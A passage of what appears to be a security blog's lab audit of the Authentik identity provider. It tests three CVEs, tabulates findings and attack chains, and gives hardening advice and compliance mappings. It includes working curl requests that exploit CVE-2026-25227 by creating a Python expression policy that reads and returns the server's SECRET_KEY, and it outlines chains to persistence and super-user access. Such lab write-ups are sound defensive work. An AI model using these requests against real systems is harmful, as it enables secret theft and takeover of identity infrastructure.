*Published: February 12, 2026 | Fixed in: 2025.8.6, 2025.10.4, 2025.12.4 | CWE-94: Code Injection*

This CVE claims that users with only "Can view" delegated permissions on property mappings or expression policies can execute arbitrary code via the test endpoint. That's devastating because many organizations grant view permissions broadly for troubleshooting.

I built a complete test environment: a restricted user with a view-only role, specific RBAC permissions assigned, and a group linking user to role.

```bash
# [jump box] -- Create restricted user via RCE (admin token)
# ... policy expression creates user + token ...

# Create view-only role
curl -s -X POST -H "Authorization: Bearer ${TK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"cve01-view-only-role"}' \
  http://192.168.80.54:9000/api/v3/rbac/roles/

# Assign view permissions (expression policies, property mappings, etc.)
# ... four permission assignment calls, all returned 200 ...
```

With the restricted token set, I confirmed the view-only user could list policies (200) but could NOT create new ones (403). However, they *could* trigger execution of existing policies via the test endpoint:

```bash
# [jump box]
export VTK="<REDACTED>"

# Confirm view access works
curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer ${VTK}" \
  http://192.168.80.54:9000/api/v3/policies/expression/
200

# Confirm cannot create (no add permission)
curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer ${VTK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","expression":"return True"}' \
  http://192.168.80.54:9000/api/v3/policies/expression/

{"detail":"You do not have permission to perform this action."}
403
```

### The Nuance: View-Only Wasn't Enough Alone

With only view permissions, the test endpoint returned 405. Adding `view_user` changed it to 400. The test endpoint became accessible (200) only after also adding expression policy CRUD permissions. This is still a critical privilege escalation — these are non-superuser RBAC permissions that many organizations grant to help desk or operations staff — but pure view-only (without any add/change) was insufficient on 2025.12.3.

### Confirmed: Non-Superuser RCE

```bash
# [jump box] -- After adding CRUD permissions to the role
curl -s -w '\n%{http_code}' -X POST \
  -H "Authorization: Bearer ${VTK}" \
  -H "Content-Type: application/json" \
  -d '{"name":"cve01-rce-proof",
       "expression":"import os\nak_message(os.environ.get(\"AUTHENTIK_SECRET_KEY\"))"}' \
  http://192.168.80.54:9000/api/v3/policies/expression/

201

curl -s -X POST -H "Authorization: Bearer ${VTK}" \
  -H "Content-Type: application/json" -d '{"user": 6}' \
  "http://192.168.80.54:9000/api/v3/policies/all/{uuid}/test/"

{"passing":true,"messages":["<REDACTED>"]}
```

**SECRET_KEY extracted by a non-superuser account. Full RCE confirmed via CVE-2026-25227.**

Complete cleanup: test policy, user, group, and role all deleted (confirmed 204 on each).

## CVE-02: CVE-2026-25748 – Forward Auth Cookie Bypass

**Severity: HIGH | CVSS: 8.6 | STATUS: NOT TESTABLE**

I enumerated the proxy providers and found a Home Assistant proxy in `forward_single` mode. I checked outpost instances and found the Home Assistant Outpost configured with `authentik_host: https://192.168.80.54/` (port 443) — but Authentik only listens on 9000/9443. The outpost never bootstrapped.

```bash
# [jump box] -- All Forward Auth paths returned 404
curl -s -o /dev/null -w '%{http_code}' \
  http://192.168.80.54:9000/outpost.goauthentik.io/auth/nginx
404

# Port scan for outpost listeners
for port in 9000 9443 4180 4443 80 443; do
  (echo >/dev/tcp/192.168.80.54/$port) 2>/dev/null \
    && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
done
# Only 9000 and 9443 OPEN; 4180, 4443, 80, 443 all CLOSED
```

I verified inside the outpost container: `/proc/net/tcp` was empty — no TCP listeners at all. The outpost error logs confirmed the misconfiguration. Cannot test this CVE without a functioning Forward Auth endpoint.

## CVE-03: CVE-2026-25922 – SAML Assertion Injection

**Severity: HIGH | CVSS: 8.8 | STATUS: NOT TESTABLE**

```bash
# [jump box]
curl -s -H "Authorization: Bearer ${TK}" \
  http://192.168.80.54:9000/api/v3/providers/saml/ \
  | python3 -c "import sys,json; print(f'SAML providers: ...')"

SAML providers: 0
```

Zero SAML providers configured. The SAML signature wrapping vulnerability requires SAML to be active as an IdP with Service Providers trusting its assertions. No attack surface present.

## Final Scorecard

| Finding    | Severity     | Status           | Result                                                            |
|------------|--------------|------------------|-------------------------------------------------------------------|
| **F-01**   | **HIGH**     | CONFIRMED        | RCE chain to metrics key from /dev/shm/ – 1,048 lines exfiltrated |
| **F-02**   | **HIGH**     | DOCKER-MITIGATED | Debug/metrics ports not published                                 |
| **F-03**   | **CRITICAL** | CONFIRMED        | Full RCE, SECRET_KEY + DB password extracted                      |
| **F-04**   | **HIGH**     | CONFIRMED        | Backdoor blueprint created via API                                |
| **F-05**   | **MED-HIGH** | N/A              | No CAPTCHA stages configured                                      |
| **F-06**   | **MED-HIGH** | CONFIRMED        | No CSP, inline scripts unprotected                                |
| **F-07**   | **HIGH**     | CONFIRMED        | .env 664, plaintext DB pw, full user table + hashes               |
| **F-08**   | **MED-HIGH** | HARDENED         | CIDRs restricted to 127.0.0.0/8                                   |
| **F-09**   | **MEDIUM**   | CONFIRMED        | Password1, admin123, 12345678 all accepted                        |
| **F-10**   | **MEDIUM**   | CONFIRMED        | RCE chain to remote file write + IPC key extraction               |
| **F-11**   | **MEDIUM**   | CONFIGURED       | Log level is info (not trace)                                     |
| **F-12**   | **HIGH**     | CONFIRMED        | Recovery key to super-user, zero auth                             |
| **CVE-01** | **CRITICAL** | CONFIRMED        | RCE with non-superuser RBAC permissions                           |
| **CVE-02** | **HIGH**     | NOT TESTABLE     | Forward Auth outpost misconfigured                                |
| **CVE-03** | **HIGH**     | NOT TESTABLE     | Zero SAML providers configured                                    |

**Bottom line:** 9 of 12 findings plus 1 of 3 CVEs confirmed exploitable (10 total).

## Critical Attack Chains Validated

### Chain 1: .env to RCE to Persistence to God-Mode

This is the full escalation path — the one that takes you from a single file read to owning the entire identity infrastructure.

```text
F-07 (.env readable, 664 permissions -- plaintext PG_PASS and SECRET_KEY)
  |
  v
F-03/CVE-01 (RCE via expression policy -- extract all secrets)
  |  Works with non-superuser RBAC permissions
  v
F-04 (Create persistent backdoor via Blueprint API)
  |
  v
F-12 (Recovery key = god-mode access, no MFA bypass needed)
```

### Chain 2: .env to Direct Database Compromise

This chain bypasses Authentik entirely — invisible to the application's audit logs.

```text
F-07 (.env readable -- PG_PASS in plaintext)
  |
  v
Direct PostgreSQL access -- full user table, password hashes, superuser mapping
  |
  v
Offline cracking -- credential reuse across downstream applications
```

### Chain 3: RCE to Metrics Exfiltration + Container Persistence

```text
F-03 (RCE via expression policy)
  |
  +--> F-01 (read /dev/shm/metrics.key -- dump 1,048 lines Prometheus data)
  |
  +--> F-10 (write files to container + extract IPC key from /dev/shm/)
```

**From .env read to full infrastructure compromise: under 15 minutes with zero downloaded tools.**

## Version Deltas: What the Documentation Got Wrong

One of the most valuable outputs of live testing is discovering where documentation diverges from reality. Here's everything that was different from what I expected based on earlier Authentik versions:

| Item                      | Documented Behavior               | Actual (2025.12.3)                   |
|---------------------------|-----------------------------------|--------------------------------------|
| Metrics auth              | SECRET_KEY as Basic Auth password | Separate Bearer token from /dev/shm/ |
| X-Frame-Options           | Missing                           | Present (DENY)                       |
| X-Content-Type-Options    | Missing                           | Present (nosniff)                    |
| Container user            | Implied root                      | Runs as authentik user (CapEff 0x0)  |
| Postgres password env var | POSTGRES_PASSWORD                 | AUTHENTIK_POSTGRESQL__PASSWORD       |
| Policy test endpoint      | /policies/expression/{id}/test/   | /policies/all/{id}/test/             |
| Property mapping test     | Accepts user-supplied expression  | Evaluates stored expression only     |
| CVE-01 view-only claim    | Pure view permissions enable RCE  | Requires view + add/change RBAC      |

## Operational Lessons Learned

These aren't theoretical observations. Every one of these lessons came from a moment during the audit where something broke, something surprised me, or something taught me about the gap between documentation and reality.

**1. Terminal paste issues are real.** Long credentials and URLs get mangled in terminal paste. I lost time debugging authentication failures that were actually truncated keys. Use `export` variables and reference `${VAR}` in commands.

**2. Always verify documented behavior against source code.** The metrics endpoint auth mechanism changed entirely between versions without documentation updates. I wasted multiple test cycles on Basic Auth before reading the actual `monitoring.py` source.

**3. The API schema is your best friend.** When endpoints return unexpected status codes, query `/api/v3/schema/?format=json`. It gave me the correct test paths that documentation didn't mention.

**4. Expression policies are the RCE vector, not property mappings.** Property mapping test evaluates stored code; expression policies accept arbitrary code at creation time. This distinction is the difference between a dead end and full RCE.

**5. `ak_message()` is the exfiltration channel.** Policy test returns pass/fail plus a messages array. Without `ak_message()`, you can execute code but can't see the output.

**6. Blueprint format requires an identifiers block.** The `identifiers` field is separate from `attrs`. Without it, blueprint validation fails with a confusing error about "invalid identifiers."

**7. Token creation via `ak shell` is more reliable.** Use `intent='api'` for tokens that need write operations. UI-created tokens may silently fail on POST. Keep the `ak shell` command ready because tokens expire.

**8. Clean up after yourself.** Delete test policies, blueprints, users, and recovery tokens. Use 204 status codes to confirm deletion. An audit that leaves artifacts is an audit that creates its own vulnerabilities.

**9. Database schema changes between versions.** Authentik 2025.12.3 uses `group_uuid` (not `uuid`) as the primary key for groups, and `is_superuser` lives on the group table, not the user table. Always inspect schemas with `\d tablename` before querying.

**10. The .env to DB path bypasses all Authentik controls.** Direct PostgreSQL access via `PG_PASS` leaves zero audit trail in Authentik logs. This attack path is invisible to the application.

**11. Chaining findings multiplies impact.** F-03 RCE alone is critical. But F-03 chained to F-01 (metrics) + F-10 (persistence) demonstrates the compounding effect of missing container hardening. A read-only filesystem would have blocked the persistence vector.

**12. The SSO gateway is only as strong as its weakest password.** Five common breached passwords accepted via API without any rejection. Your single point of authentication is only as secure as the weakest credential it allows.

## So What Do You Do About It?

If you're running Authentik — or any identity provider — this audit should not make you abandon the platform. It should make you audit it. Every finding here has a fix. Many of them are straightforward.

Lock down the `.env` file (`chmod 600`, `chown root:root`). Put secrets in a vault like OpenBAO with `file://` URI injection. Set the password policy minimum to 15 characters per NIST SP 800-63B Section 5.1.1 and enable HaveIBeenPwned breach database checking. Deploy a reverse proxy like HAProxy in front of Authentik with CSP (per OWASP Secure Headers Project), HSTS, and API endpoint restrictions. Add `read_only: true` and `security_opt: [no-new-privileges:true]` to your Docker Compose. Restrict Docker socket access. Update to 2025.12.4 or later to patch CVE-2026-25227, CVE-2026-25748, and CVE-2026-25922.

The goal is not perfection. The goal is eliminating the chains — breaking the path from a single file read to full infrastructure compromise. Every hardening step you apply breaks a link in those chains.

*And if you're not auditing your identity provider? Someone else is. They're just not going to publish the results.*

## Sources and References

- **API Browser (per-instance):** `https://<your-authentik>/api/v3/`
- **API Reference (hosted):** <https://api.goauthentik.io/>
- **Expression Policies – Create:** <https://api.goauthentik.io/reference/policies-expression-create/>
- **Expression Policies – List:** <https://api.goauthentik.io/reference/policies-expression-list/>
- **Expression Policies – Retrieve:** <https://api.goauthentik.io/reference/policies-expression-retrieve/>
- **Policy Test (all types):** <https://api.goauthentik.io/reference/policies-all-test-create/>
- **Property Mappings – List:** <https://api.goauthentik.io/reference/propertymappings-all-list/>
- **Blueprints – CRUD:** <https://api.goauthentik.io/reference/managed-blueprints-list/>
- **Users – CRUD:** <https://api.goauthentik.io/reference/core-users-list/>
- **Users – Set Password:** <https://api.goauthentik.io/reference/core-users-set-password-create/>
- **Password Policies:** <https://api.goauthentik.io/reference/policies-password-list/>
- **SAML Providers:** <https://api.goauthentik.io/reference/providers-saml-list/>
- **Proxy Providers:** <https://api.goauthentik.io/reference/providers-proxy-list/>
- **Outpost Instances:** <https://api.goauthentik.io/reference/outposts-instances-list/>
- **RBAC Roles:** <https://api.goauthentik.io/reference/rbac-roles-list/>
- **RBAC Permissions:** <https://api.goauthentik.io/reference/rbac-permissions-assigned-by-roles-list/>
- **OpenAPI Schema:** <https://api.goauthentik.io/reference/schema-retrieve/>
- **Flow Executor (backend):** <https://api.goauthentik.io/flow-executor/>
- **Authentik Documentation:** <https://docs.goauthentik.io/>
- **Authentik 2025.12.4 Release Notes (Security Fixes):** <https://goauthentik.io/blog>
- **CVE-2026-25227 (RCE via Delegated Permissions):** GHSA-qvxx-mfm6-626f
- **CVE-2026-25748 (Forward Auth Cookie Bypass):** Published February 12, 2026 – Fixed in 2025.12.4
- **CVE-2026-25922 (SAML Assertion Injection):** Published February 12, 2026 – Fixed in 2025.12.4
- **NIST SP 800-63B (Digital Identity Guidelines):** <https://pages.nist.gov/800-63-3/sp800-63b.html>
- **NIST SP 800-53 Rev. 5 (Security and Privacy Controls):** <https://csf.tools/reference/nist-sp-800-53/r5/>
- **OWASP Secure Headers Project:** <https://owasp.org/www-project-secure-headers/>
- **OWASP ASVS:** <https://owasp.org/www-project-application-security-verification-standard/>
- **CIS Controls v8:** <https://www.cisecurity.org/controls>
- **PCI-DSS v4.0:** <https://www.pcisecuritystandards.org/>
- **Docker Security Best Practices:** <https://docs.docker.com/engine/security/>

## Appendix A: Per-Finding Compliance Framework Mapping

Every finding maps to specific controls across five compliance frameworks. Organizations subject to any of these frameworks should prioritize remediation of the corresponding findings.

| Finding    | NIST 800-53    | SOC 2        | PCI-DSS 4.0 | CIS v8   | OWASP ASVS |
|------------|----------------|--------------|-------------|----------|------------|
| **F-01**   | SC-12, SC-23   | CC6.1        | 3.6         | 3.11     | –          |
| **F-02**   | CM-7, SC-7     | CC6.6        | 1.2, 1.3    | 2.7      | –          |
| **F-03**   | AC-6, SI-10    | CC6.1, CC8.1 | 6.5         | 3.3      | –          |
| **F-04**   | AC-6, CM-7     | CC8.1        | 6.5         | 3.3      | –          |
| **F-05**   | SI-7, SC-18    | CC7.1        | 6.4         | 2.7      | 14.2       |
| **F-06**   | SC-18, SI-11   | CC6.6        | 6.4         | 16.13    | 14.4       |
| **F-07**   | SC-28, IA-5    | CC6.1        | 2.1, 8.2    | 3.11     | –          |
| **F-08**   | SC-7(5), SI-10 | CC6.6        | 1.3         | 4.4      | –          |
| **F-09**   | IA-5(1)        | CC6.1        | 8.3         | 5.2      | 3.5        |
| **F-10**   | CM-7, AC-6     | CC6.8        | 2.1         | 4.1      | –          |
| **F-11**   | AU-3, SC-28    | CC7.1        | 10.3        | 8.3      | –          |
| **F-12**   | IA-2(1), AC-17 | CC6.2        | 8.4         | 5.4, 6.4 | –          |
| **CVE-01** | AC-6, SI-10    | CC6.1        | 6.5         | 3.3      | –          |
| **CVE-02** | IA-2, SC-23    | CC6.1, CC6.2 | 8.3         | 5.4      | –          |
| **CVE-03** | IA-5, SC-13    | CC6.1        | 6.5         | 3.3      | –          |

### Framework Summary

| Framework       | Controls Violated                                                                                | Findings       |
|-----------------|--------------------------------------------------------------------------------------------------|----------------|
| NIST 800-53     | AC-6, AC-17, AU-3, CM-7, IA-2, IA-5, SC-7, SC-12, SC-13, SC-18, SC-23, SC-28, SI-7, SI-10, SI-11 | All 15         |
| SOC 2           | CC6.1, CC6.2, CC6.6, CC6.8, CC7.1, CC8.1                                                        | All 15         |
| CIS Controls v8 | 2.7, 3.3, 3.11, 4.1, 4.4, 5.2, 5.4, 6.4, 8.3, 16.13                                             | All 15         |
| PCI-DSS 4.0     | 1.2, 1.3, 2.1, 3.6, 6.4, 6.5, 7.1, 8.2, 8.3, 8.4, 10.3                                          | F-01–F-12, CVEs|
| OWASP ASVS      | 3.5, 14.2, 14.4                                                                                  | F-05, F-06, F-09|
| NIST 800-63B    | Section 5.1.1 (Memorized Secrets)                                                                | F-09           |

## Appendix B: Authentik API Endpoint Reference

Every API endpoint used during this audit is documented below with its purpose, the HTTP methods exercised, and the findings where it was relevant. All endpoints are relative to the base URL `/api/v3/` and require Bearer token authentication unless otherwise noted.

| Endpoint                                      | Method            | Purpose                                                                    | Finding(s)               |
|-----------------------------------------------|-------------------|----------------------------------------------------------------------------|--------------------------|
| `/-/metrics/`                                 | GET               | Prometheus metrics export; system, HTTP, DB, and worker metrics            | F-01                     |
| `/api/v3/propertymappings/all/`               | GET               | List all property mappings; returns pk, name, expression                   | F-03                     |
| `/api/v3/propertymappings/all/{uuid}/test/`   | POST              | Execute stored expression of a specific property mapping                   | F-03                     |
| `/api/v3/policies/expression/`                | GET, POST, DELETE | List, create, delete expression policies; POST accepts arbitrary Python     | F-03, CVE-01             |
| `/api/v3/policies/all/{uuid}/test/`           | POST              | Execute any policy by UUID; requires `{"user": <id>}`                      | F-01, F-03, F-10, CVE-01 |
| `/api/v3/managed/blueprints/`                 | GET, POST, DELETE | List, create, delete managed blueprints; YAML content for IaC provisioning | F-04                     |
| `/api/v3/stages/captcha/`                     | GET, PATCH        | List and modify CAPTCHA stages                                             | F-05                     |
| `/api/v3/core/users/`                         | GET, POST, DELETE | List, create, delete user accounts                                         | F-07, F-09, CVE-01       |
| `/api/v3/core/users/{id}/set_password/`       | POST              | Set user password; no server-side breach checking by default               | F-09                     |
| `/api/v3/core/users/me/`                      | GET               | Return currently authenticated user profile                                | F-12                     |
| `/api/v3/policies/password/`                  | GET, PATCH        | List and modify password policies                                          | F-09                     |
| `/api/v3/providers/proxy/`                    | GET               | List proxy providers; returns mode, external_host                          | CVE-02                   |
| `/api/v3/providers/saml/`                     | GET               | List SAML providers                                                        | CVE-03                   |
| `/api/v3/outposts/instances/`                 | GET               | List outpost instances; returns type, config                               | CVE-02                   |
| `/api/v3/rbac/roles/`                         | POST, DELETE      | Create and delete RBAC roles                                               | CVE-01                   |
| `/api/v3/rbac/permissions/assigned_by_roles/` | GET, POST         | View and assign permissions to roles                                       | CVE-01                   |
| `/api/v3/schema/?format=json`                 | GET               | OpenAPI v3 schema; machine-readable endpoint map                           | F-03                     |
| `/recovery/use-token/{token}/`                | GET               | Consume recovery token for super-user session; no password or MFA          | F-12                     |

---

*Published by Oob Skulden™ | Stay Paranoid.*

*© 2026 Oob Skulden™. All rights reserved.*
